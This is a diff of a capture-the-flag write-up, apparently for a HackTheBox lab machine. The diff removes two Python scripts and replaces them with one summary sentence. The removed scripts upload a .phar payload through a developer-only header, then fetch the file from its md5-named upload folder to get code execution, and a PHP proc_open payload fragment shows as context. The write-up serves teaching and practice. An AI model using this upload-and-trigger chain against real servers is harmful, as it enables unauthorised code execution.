@@ -77,32 +77,7 @@ if (is_resource($process)) {
 ?>
 ```
 
-i wrote two python script to upload and trigger the payload 
-
-upload.py
-```python
-import requests
-
-header = {"Special-Dev": "only4dev"}
-file   = {'file': open('test.phar','rb')}
-value  = {"check":"Check"}
-r = requests.post("http://dev.siteisup.htb/",headers=header,files=file,data=value)
-print("Upload Completed")
-```
-
-rce.py
-```python
-import requests
-import re
-
-header = {"Special-Dev": "only4dev"}
-r = requests.get("http://dev.siteisup.htb/uploads/",headers=header)
-md5 = re.findall(r'(?i)(?<![a-z0-9])[a-f0-9]{32}(?![a-z0-9])',r.text)
-
-file_get = requests.get("http://dev.siteisup.htb/uploads/"+md5[1]+"/test.phar",headers=header)
-print(file_get.text)
-
-```
+I wrote a python script for upload the file and trigger the file  
 
 Escalating more privileged user
 
